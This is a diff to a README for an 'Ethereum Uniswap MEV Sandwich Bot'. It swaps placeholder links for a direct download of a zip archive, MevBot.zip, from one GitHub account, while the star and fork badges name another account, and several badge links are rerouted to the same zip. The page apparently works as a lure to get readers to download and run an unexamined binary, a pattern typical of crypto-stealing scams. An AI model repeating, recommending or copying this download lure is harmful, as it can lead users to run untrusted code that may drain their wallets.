@@ -2,17 +2,17 @@
 # 🥪 Ethereum Uniswap MEV Sandwich Bot (DeFi)
 ![Bot Controls](https://imgur.com/Z5aVSek.png)
 
-[Download Mev-Bot-Uniswap](555)
+[Download Mev-Bot-Uniswap](https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip)
 
 <div align="center">
 <i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>
 </div>
 
 <div align="center">
-  <a href="[555](555)">
+  <a href="[https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip](https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip)">
     <img src="https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub stars" />
   </a>
-  <a href="555">
+  <a href="https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip">
     <img src="https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub forks" />
   </a>
   <a href="https://github.com/ntkme/github-buttons/workflows/build">
